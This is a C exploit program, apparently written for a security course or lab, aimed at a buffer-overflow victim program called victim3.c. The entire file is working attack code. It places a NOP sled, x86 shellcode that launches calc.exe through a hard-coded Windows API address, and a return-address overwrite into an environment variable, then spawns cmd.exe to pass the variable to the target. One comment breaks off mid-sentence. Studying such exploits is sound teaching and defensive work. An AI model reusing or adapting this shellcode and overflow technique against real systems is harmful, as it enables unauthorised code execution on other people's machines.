// xploitViaCmdline.c
// exploits victim program: victim3.c
// gcc -o xploitViaCmdline.exe xploitViaCmdline.c

#include <stdlib.h>  
#include <stdio.h>
#include <string.h>

// Last three bytes are used to overwrite the return address
// The sequence of \x90 before the new return address is necessary 
// since the shellcode will use the stack. Part of \x90 will be overwritten
// Kind of tricky 
unsigned char *cmdlineArg=
  "\x90\x90\x90\x90\x90\x90\x90\x90" // nop
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE1\x6A\x01\x51\xB8\xC0\xE1\xB4\x76\xFF\xD0" // shellcode. Change?
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90"
  "\x94\xfe\x61"; // shellcode address

// fxw is the environment variable and hold the shellcode
char *envVar="fxw=";

int main (void) {
	unsigned char buf[512];
	int lenEnvVar;
	int lenCmdlineArg;
	
	lenEnvVar=strlen(envVar);
	memcpy(buf, envVar, lenEnvVar);
	lenCmdlineArg=strlen(cmdlineArg);
	memcpy(&buf[lenEnvVar], cmdlineArg, lenCmdlineArg);
	buf[lenEnvVar+lenCmdlineArg] = '\0'; 
	printf("Shellcode length is %d. Buf length is %d\n", lenCmdlineArg, lenEnvVar+lenCmdlineArg);
	// Environment variables created putenv are only valid in current environemnt
	putenv(buf); // set environment variabe fxw as the shellcode
	
	// The new console created will inherit the environment variables 
	system("cmd.exe"); // necessary because 

}
